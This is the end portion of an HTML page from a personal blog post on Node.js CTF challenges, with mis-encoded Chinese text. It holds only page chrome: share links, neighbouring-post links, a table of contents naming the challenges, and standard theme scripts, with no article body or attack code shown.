       <!-- ÂèÇËÄÉËµÑÊñô„ÄÅÁõ∏ÂÖ≥ËµÑÊñôÁ≠â -->
      
       <!-- Áõ∏ÂÖ≥ÊñáÁ´† -->
      
      <!-- ÁâàÊùÉÂ£∞ÊòéÁªÑ‰ª∂ -->
      
      <!-- ÊâìËµèÁªÑ‰ª∂ -->
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-06-06T17:11:09+08:00">
  <a class='notlink'>
    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
    <p>Êõ¥Êñ∞‰∫éÔºöJun 6, 2024</p>
  </a>
</div>

        
      
        
          

        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/05/30/node%E5%B0%8F%E7%BB%83/&title=nodeÂ∞èÁªÉ - JijoyÁöÑblog&summary="
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/05/30/node%E5%B0%8F%E7%BB%83/&title=nodeÂ∞èÁªÉ - JijoyÁöÑblog&summary="
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
          
          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/05/30/node%E5%B0%8F%E7%BB%83/&title=nodeÂ∞èÁªÉ - JijoyÁöÑblog&summary="
          
          >
          
            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
          
        </a>
      
    
      
    
      
    
  </div>
</div>



        
      
    </div>
    <!-- Custom Files bottomMeta begin -->
    
    <!-- Custom Files bottomMeta end -->
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>
          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>ÂéüÂûãÈìæÊ±°Êüì</p>
          <p class='content'>ÂéüÂûãÈìæÊ±°ÊüìÂâçÈù¢Êúâ‰∏§Âº†ÂçöÂÆ¢ÂØπ JS ÁöÑÁªßÊâøÂíåÂéüÂûãÈìæËøõË°å‰∫Ü‰∏Ä‰∏™ÊØîËæÉËØ¶ÁªÜÁöÑËß£ÈáäÔºåÈÇ£‰πàÂéüÂûãÈìæÊ±°Êüì‰πüÂ∞±ÊØîËæÉÂ•ΩÁêÜËß£‰∫Ü
ÁÆÄÂçïÁöÑËØ¥ÔºåÂ∞±ÊòØÊàë‰ª¨ÊéßÂà∂ÁßÅÊúâÂ±ûÊÄß(__proto__)ÊåáÂêëÁöÑÂéüÂûãÂØπË±°ÔºàprototypeÔºâ...</p>
        </a>
      
      
        <a class='next' href='/2024/05/26/%E5%8E%9F%E5%9E%8B%E9%93%BE/'>
          <p class='title'>ÂéüÂûãÈìæ<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>‰ªéÂéüÂûãÂà∞ÂéüÂûãÈìæÂâçÈù¢‰∏ªË¶ÅÂ§ßÊ¶Ç‰∫ÜËß£‰∫Ü‰∏Ä‰∫õÂéüÂûãÈìæÁöÑ‰∏Ä‰∫õÁü•ËØÜÔºåËøôÈáåÈáçÁÇπÊ∑±Âåñ‰∏Ä‰∏ã
prototypeÊØè‰∏™ÂáΩÊï∞ÈÉΩÊúâ‰∏Ä‰∏™ prototype Â±ûÊÄß

ÂáΩÊï∞ÁöÑ prototype Â±ûÊÄßÊåáÂêë‰∫Ü‰∏Ä‰∏™ÂØπË±°ÔºåËøô‰∏™ÂØπË±°Ê≠£...</p>
        </a>
      
    </div>
  
  <!-- Custom Files postEnd begin-->
  
  <!-- Custom Files postEnd end-->
</article>


  


  <article class="post white-box shadow floatable blur" id="comments">
    <span hidden>
      <meta itemprop="discussionUrl" content="/2024/05/30/node%E5%B0%8F%E7%BB%83/index.html#comments">
    </span>
    <p ct><i class='fa-solid fa-comments'></i> ËØÑËÆ∫</p>
    

    <div id="layoutHelper-comments"></div>

  </article>






</div>
<aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
  

  
    
    
      
    
  


<div class="widget-sticky pjax">

  
  


  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
    
  <header>
    
      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>Êú¨ÊñáÁõÆÂΩï</span>
    
  </header>


    <div class='content'>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E"><span class="toc-text">[NPUCTF2020]È™åËØÅüêé</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ez-Express"><span class="toc-text">[GYCTF2020]Ez_Express</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Node-Game"><span class="toc-text">[GYCTF2020]Node Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2021%E7%A5%A5%E4%BA%91%E6%9D%AF-secrets-of-admin"><span class="toc-text">[2021Á••‰∫ëÊùØ]secrets_of_admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-BabyJS"><span class="toc-text">[ÁΩëÈºéÊùØ 2020 ÂçäÂÜ≥Ëµõ]BabyJS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z"><span class="toc-text">[2021Á••‰∫ëÊùØ]cralwer_z</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2021-easynode"><span class="toc-text">[GKCTF 2021]easynode</span></a></li></ol>
    </div>
  </section>

  

</div>


<!-- Ê≤°Êúâ pjax Âç†‰Ωç‰ºöÊä•Èîô ‰∏áÊÅ∂ÁöÑ pjax -->

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <div class="pjax">
    <!-- pjaxÂç†‰Ωç -->
  </div>

  <!-- Custom Files side begin -->
  
  <!-- Custom Files side end -->
</aside>



          <!--Ê≠§Êñá‰ª∂Áî®Êù•Â≠òÊîæ‰∏Ä‰∫õ‰∏çÊñπ‰æøÂèñÂÄºÁöÑÂèòÈáè-->
<!--ÊÄùË∑ØÂ§ßÊ¶ÇÊòØÂ∞ÜÂÄºËóèÂà∞ÈáçÂä†ËΩΩÁöÑÂå∫ÂüüÂÜÖ-->

<pjax>
<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  pdata.commentConfig={};
  //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
  
    // header
    var l_header=document.getElementById("l_header");
    
    l_header.classList.add("show");
    
    
      // cover
      var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
      var scroll_down=document.getElementById('scroll-down');
      cover_wrapper.id="none";
      cover_wrapper.style.display="none";
      scroll_down.style.display="none";
    
  
</script>
</pjax>
        </div>
        
  
  <footer class="footer clearfix"  itemscope itemtype="http://schema.org/WPFooter">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
          
            
          
            
          
            
          
        </div>
      
    
      
        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
      
    
      
        
          <div><p><span id="lc-sv">Êú¨Á´ôÊÄªËÆøÈóÆÈáè‰∏∫ <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span> Ê¨°</span> <span id="lc-uv">ËÆøÂÆ¢Êï∞‰∏∫ <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span> ‰∫∫</span></p>
</div>
        
      
    
      
        Use
        <a href="https://github.com/volantis-x/hexo-theme-volantis/#5.8.0" target="_blank" class="codename">Volantis</a>
        as theme
      
    
      
        <div class='copyright'>
        <p><a href="/">Copyright ¬© since 2017 XXX</a></p>

        </div>
      
    
    <!-- Custom Files footer begin-->
    
    <!-- Custom Files footer end-->
  </footer>


        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" href="/" onclick="return false;" title="top"></a>
      </div>
    </div>
    <div>
      <script>
  /******************** volantis.dom ********************************/
  // È°µÈù¢ÈÄâÊã©Âô® Â∞ÜdomÂØπË±°ÁºìÂ≠òËµ∑Êù• see: /source/js/app.js etc.
  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // È°µÈù¢‰∏ª‰Ωì
  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // Âêë‰∏ä
  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // Êï¥‰∏™ÂØºËà™Ê†è
  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1‰∏™
  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // ÊêúÁ¥¢ÊåâÈíÆ   ÁßªÂä®Á´Ø 1‰∏™
  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // ÁßªÂä®Á´ØÂØºËà™Ê†è
  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // ÊêúÁ¥¢Ê°Ü Ê°åÈù¢Á´Ø ÁßªÂä®Á´Ø 1‰∏™
  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  ÊâãÊú∫Á´Ø Â≠êËèúÂçï Â§ö‰∏™
</script>

<script>
  
  volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fortawesome/fontawesome-free/css/all.min.css");
  
  
  
</script>

<!-- required -->


<!-- internal -->

<script src="/js/app.js"></script>






<!-- rightmenuË¶ÅÂú®darkmode‰πãÂâçÔºàToggleButtonÔºâ darkmodeË¶ÅÂú®comments‰πãÂâçÔºàvolantis.dark.pushÔºâ-->



<script>
  function loadIssuesJS() {
    
      const sites_api = document.getElementById('sites-api');
      if (sites_api != undefined && typeof SitesJS === 'undefined') {
        volantis.js("/js/plugins/tags/sites.js")
      }
    
    
      const friends_api = document.getElementById('friends-api');
      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
        volantis.js("/js/plugins/tags/friends.js")
      }
    
    
      const contributors_api = document.getElementById('contributors-api');
      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
        volantis.js("/js/plugins/tags/contributors.js")
      }
    
  };
  loadIssuesJS()
  volantis.pjax.push(()=>{
    loadIssuesJS();
  })

</script>




  <script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/vanilla-lazyload/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: ["#"],
	maxRPS: 6,
	hoverDelay: 0
  };
</script>
<script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/flying-pages/flying-pages.min.js"></script>









      <script>
  volantis.layoutHelper("comments",`<div id="beaudar_container"></div>`)

  volantis.beaudar = {};

  function check_beaudar() {
    if (volantis.dark.mode === "dark") {
      volantis.beaudar.Theme = 'github-dark';
    } else {
      volantis.beaudar.Theme = 'github-light';
    }

    return document.getElementById("beaudar_container");
  }

  function pjax_beaudar() {
    const HEAD = check_beaudar();
    if (!HEAD) return;

    const script = document.createElement('script');
    let issuenumber = "";
    if (issuenumber) {
      script.setAttribute('issue-number', issuenumber);
    } else {
      script.setAttribute('issue-term', "pathname");
    }
    script.setAttribute('src', 'https://beaudar.lipk.org/client.js');
    script.setAttribute('repo', 'Oliverial/Oliverial.github.io');
    script.setAttribute('input-position', 'top');
    script.setAttribute('branch', 'main');
    script.setAttribute('comment-order', 'desc');
    script.setAttribute('label', '‚ú®üí¨‚ú®');
    script.setAttribute('theme', volantis.beaudar.Theme);
    script.setAttribute('crossorigin', "anonymous");
    HEAD.appendChild(script);
  }

  function dark_beaudar() {
    const HEAD = check_beaudar();
    if (!HEAD) return;

    const message = {
      type: 'set-theme',
      theme: volantis.beaudar.Theme
    };
    const beaudarIframe = document.querySelector('iframe');
    beaudarIframe.contentWindow.postMessage(message, 'https://beaudar.lipk.org');
  }

  function check_beaudar_style() {
    // Beaudar ‰ºöÂæÄ HEAD ÁöÑÈ¶ñËäÇÁÇπËøΩÂä†Ê†∑ÂºèÂÖÉÁ¥†ÔºåËÄåËøô‰∏™ËøΩÂä†Ê≤°ÊúâÊ∑ªÂä†Âà§Êñ≠
    // ÊâÄ‰ª• Pjax ‰∏ã‰ºöÂ§öÊ¨°Ê∑ªÂä†Ê†∑ÂºèÊñá‰ª∂ÔºåÁï•ÂæÆÈ∫ªÁÉ¶„ÄÇ
    const checkStyle = document.querySelector('head').firstElementChild;
    if(checkStyle.innerText.includes('beaudar')) checkStyle.remove();
  }

  pjax_beaudar();
  volantis.pjax.push(check_beaudar_style);
  volantis.pjax.push(pjax_beaudar);
  volantis.dark.push(dark_beaudar);
</script>

    





<!-- optional -->

  <script>
  const SearchServiceDataPathRoot = ("/" || "/").endsWith("/") ?
    "/" || "/" :
    "//" || "/";
  const SearchServiceDataPath = SearchServiceDataPathRoot + "content.json";

  function loadSearchScript() {
    // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
    return volantis.js("/js/search/hexo.js");
  }

  function loadSearchService() {
    loadSearchScript();
    document.querySelectorAll(".input.u-search-input").forEach((e) => {
      e.removeEventListener("focus", loadSearchService, false);
    });

    document.querySelectorAll(".u-search-form").forEach((e) => {
      e.addEventListener("submit", (event) => {
        event.preventDefault();
      }, false);
    });
  }

  // ÊâìÂºÄÂπ∂ÊêúÁ¥¢ Â≠óÁ¨¶‰∏≤ s
  function OpenSearch(s) {
    if (typeof SearchService === 'undefined')
      loadSearchScript().then(() => {
        SearchService.setQueryText(s);
        SearchService.search();
      });
    else {
      SearchService.setQueryText(s);
      SearchService.search();
    }
  }

  // ËÆøÈóÆÂê´Êúâ ?s=xxx  ÁöÑÈìæÊé•Êó∂ÊâìÂºÄÊêúÁ¥¢ // ‰∏éÊêúÁ¥¢ÂºïÊìé structured data Áõ∏ÂÖ≥: /scripts/helpers/structured-data/lib/config.js
  if (window.location.search && /^\?s=/g.test(window.location.search)) {
    let queryText = decodeURI(window.location.search)
      .replace(/\ /g, "-")
      .replace(/^\?s=/g, "");
    OpenSearch(queryText);
  }

  // ÊêúÁ¥¢ËæìÂÖ•Ê°ÜËé∑ÂèñÁÑ¶ÁÇπÊó∂Âä†ËΩΩÊêúÁ¥¢
  document.querySelectorAll(".input.u-search-input").forEach((e) => {
    e.addEventListener("focus", loadSearchService, false);
  });
</script>







  <script>



  function pjax_highlightjs_copyCode(){
    if (!(document.querySelector(".highlight .code pre") ||
      document.querySelector(".article pre code"))) {
      return;
    }
    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
  }
  volantis.requestAnimationFrame(pjax_highlightjs_copyCode)
  volantis.pjax.push(pjax_highlightjs_copyCode)

</script>












  <script>
  function load_swiper() {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.css");
    volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.js").then(() => {
      pjax_swiper();
    });
  }

  load_swiper();

  function pjax_swiper() {
    volantis.swiper = new Swiper('.swiper-container', {
      slidesPerView: 'auto',
      spaceBetween: 8,
      centeredSlides: true,
      loop: true,
      pagination: {
        el: '.swiper-pagination',
        clickable: true,
      },
      navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
      },
    });
  }

  volantis.pjax.push(() => {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    if (typeof volantis.swiper === "undefined") {
      load_swiper();
    } else {
      pjax_swiper();
    }
  });
</script>


<!-- pjax Ê†áÁ≠æÂøÖÈ°ªÂ≠òÂú®‰∫éÊâÄÊúâÈ°µÈù¢ Âê¶Âàô pjax error -->
<pjax>

</pjax>

<script>
  function listennSidebarTOC() {
    const navItems = document.querySelectorAll(".toc li");
    if (!navItems.length) return;
    let targets = []
    const sections = [...navItems].map((element) => {
      const link = element.querySelector(".toc-link");
      const target = document.getElementById(
        decodeURI(link.getAttribute("href")).replace("#", "")
      );
      targets.push(target)
      // Ëß£Èô§ a Ê†áÁ≠æ href ÁöÑ ÈîöÁÇπÂÆö‰Ωç, a Ê†áÁ≠æ href ÁöÑ ÈîöÁÇπÂÆö‰Ωç ‰ºöÈöèÊú∫ÂêØÁî®?? ‰∫ßÁîüÈîô‰Ωç???
      link.setAttribute("onclick","return false;")
      link.setAttribute("toc-action","toc-"+decodeURI(link.getAttribute("href")).replace("#", ""))
      link.setAttribute("href","/")
      // ÈÖçÁΩÆ ÁÇπÂáª Ëß¶ÂèëÊñ∞ÁöÑÈîöÁÇπÂÆö‰Ωç
      link.addEventListener("click", (event) => {
        event.preventDefault();
        // ËøôÈáåÁöÑ addTop ÊòØÈÄöËøáÈîô‰Ωç‰ΩøÂæó toc Ëá™Âä®Â±ïÂºÄ.
        volantis.scroll.to(target,{addTop: 5, observer:true})
        // Anchor id
        history.pushState(null, document.title, "#" + target.id);
      });
      return target;
    });

    function activateNavByIndex(target) {
      if (target.classList.contains("active-current")) return;

      document.querySelectorAll(".toc .active").forEach((element) => {
        element.classList.remove("active", "active-current");
      });
      target.classList.add("active", "active-current");
      let parent = target.parentNode;
      while (!parent.matches(".toc")) {
        if (parent.matches("li")) parent.classList.add("active");
        parent = parent.parentNode;
      }
    }

    // ÊñπÊ°à‰∏ÄÔºö
    volantis.activateNavIndex=0
    activateNavByIndex(navItems[volantis.activateNavIndex])
    volantis.scroll.push(()=>{
      if (targets[0].getBoundingClientRect().top >= 0) {
        volantis.activateNavIndex = 0
      }else if (targets[targets.length-1].getBoundingClientRect().top < 0) {
        volantis.activateNavIndex = targets.length-1
      } else {
        for (let index = 0; index < targets.length; index++) {
          const target0 = targets[index];
          const target1 = targets[(index+1)%targets.length];
          if (target0.getBoundingClientRect().top < 0&&target1.getBoundingClientRect().top >= 0) {
            volantis.activateNavIndex=index
            break;
          }
        }
      }
      activateNavByIndex(navItems[volantis.activateNavIndex])
    })

    // ÊñπÊ°à‰∫åÔºö
    // IntersectionObserver ‰∏çÊòØÂÆåÁæéÁ≤æÁ°ÆÂà∞ÂÉèÁ¥†Á∫ßÂà´ ‰πü‰∏çÊòØ‰ΩéÂª∂Êó∂ÊÄßÁöÑ
    // function findIndex(entries) {
    //   let index = 0;
    //   let entry = entries[index];
    //   if (entry.boundingClientRect.top > 0) {
    //     index = sections.indexOf(entry.target);
    //     return index === 0 ? 0 : index - 1;
    //   }
    //   for (; index < entries.length; index++) {
    //     if (entries[index].boundingClientRect.top <= 0) {
    //       entry = entries[index];
    //     } else {
    //       return sections.indexOf(entry.target);
    //     }
    //   }
    //   return sections.indexOf(entry.target);
    // }
    // function createIntersectionObserver(marginTop) {
    //   marginTop = Math.floor(marginTop + 10000);
    //   let intersectionObserver = new IntersectionObserver(
    //     (entries, observe) => {
    //       let scrollHeight = document.documentElement.scrollHeight;
    //       if (scrollHeight > marginTop) {
    //         observe.disconnect();
    //         createIntersectionObserver(scrollHeight);
    //         return;
    //       }
    //       let index = findIndex(entries);
    //       activateNavByIndex(navItems[index]);
    //     }, {
    //       rootMargin: marginTop + "px 0px -100% 0px",
    //       threshold: 0,
    //     }
    //   );
    //   sections.forEach((element) => {
    //     element && intersectionObserver.observe(element);
    //   });
    // }
    // createIntersectionObserver(document.documentElement.scrollHeight);
  }

  document.addEventListener("DOMContentLoaded", ()=>{
    volantis.requestAnimationFrame(listennSidebarTOC)
  });
  document.addEventListener("pjax:success", ()=>{
    volantis.requestAnimationFrame(listennSidebarTOC)
  });
</script>



<script>
  document.onreadystatechange = function () {
    if (document.readyState == 'complete') {
      // È°µÈù¢Âä†ËΩΩÂÆåÊØï Ê†∑ÂºèÂä†ËΩΩÂ§±Ë¥•ÔºåÊàñÊòØÂΩìÂâçÁΩëÈÄüÊÖ¢ÔºåÊàñÊòØÂºÄÂêØ‰∫ÜÁúÅÊµÅÊ®°Âºè
      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
        document.querySelectorAll(".reveal").forEach(function (e) {
          e.style["opacity"] = "1";
        });
        document.querySelector("#safearea").style["display"] = "block";
      }
    }
  }
</script>


  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"JijoyÁöÑblog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"JijoyÁöÑblog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/05/30/nodeÂ∞èÁªÉ/","name":"nodeÂ∞èÁªÉ"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"JijoyÁöÑblog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"JijoyÁöÑblog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"nodeÂ∞èÁªÉ","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/05/30/node%E5%B0%8F%E7%BB%83/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"JijoyÁöÑblog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/05/30/node%E5%B0%8F%E7%BB%83/","wordCount":0,"datePublished":"2024-05-30T08:57:46.000Z","dateModified":"2024-06-06T09:11:09.892Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>



      
        <!--
  pjaxÈáçËΩΩÂå∫ÂüüÊé•Âè£Ôºö
  1.  <pjax></pjax> Ê†áÁ≠æ pjax Ê†áÁ≠æÂøÖÈ°ªÂ≠òÂú®‰∫éÊâÄÊúâÈ°µÈù¢ Âê¶Âàô pjax error
  2.  script[data-pjax]
  3.  .pjax-reload script
  4.  .pjax
-->



<script src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/pjax/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox]):not([onclick="return false;"]):not([onclick="return!1"]):not([target="_blank"]):not([target="view_window"]):not([href$=".xml"])',
        selectors: [
          "head title",
          "head meta[name=keywords]",
          "head meta[name=description]",
          
          "#l_main",
          "#pjax-header-nav-list",
          ".pjax",
          "pjax", // <pjax></pjax> Ê†áÁ≠æ
          "script[data-pjax], .pjax-reload script" // scriptÊ†áÁ≠æÊ∑ªÂä†data-pjax Êàñ scriptÊ†áÁ≠æÂ§ñÂ±ÇÊ∑ªÂä†.pjax-reload ÁöÑscript‰ª£Á†ÅÊÆµÈáçËΩΩ
        ],
        cacheBust: false,   // url Âú∞ÂùÄËøΩÂä†Êó∂Èó¥Êà≥ÔºåÁî®‰ª•ÈÅøÂÖçÊµèËßàÂô®ÁºìÂ≠ò
        timeout: 5000,
        
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // Áõ∏ÂΩì‰∫éÁÇπÂáª‰∫ÜÊµèËßàÂô®ÁöÑÂÅúÊ≠¢ÊåâÈíÆ

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      // ‰ΩøÁî® volantis.pjax.send ÊñπÊ≥ï‰º†ÂÖ•pjax:sendÂõûË∞ÉÂáΩÊï∞ ÂèÇËßÅlayout/_partial/scripts/global.ejs
      volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      // ‰ΩøÁî® volantis.pjax.push ÊñπÊ≥ï‰º†ÂÖ•ÈáçËΩΩÂáΩÊï∞ ÂèÇËßÅlayout/_partial/scripts/global.ejs
      volantis.pjax.method.complete.start();
    });

    document.addEventListener('pjax:error', function (e) {
      if(volantis.debug) {
        console.error(e);
        console.log('pjax error: \n' + JSON.stringify(e));
      }else{
        // ‰ΩøÁî® volantis.pjax.error ÊñπÊ≥ï‰º†ÂÖ•pjax:errorÂõûË∞ÉÂáΩÊï∞ ÂèÇËßÅlayout/_partial/scripts/global.ejs
        volantis.pjax.method.error.start();
        window.location.href = e.triggerElement.href;
      }
    });
</script>

      
    </div>
    <!-- import body_end begin-->
    <!-- import body_end end-->
    <!-- Custom Files bodyEnd begin-->
    
    <!-- Custom Files bodyEnd end-->
    <!-- front-matter body_end begin -->
    <!-- front-matter body_end end -->
  </body>
</html>
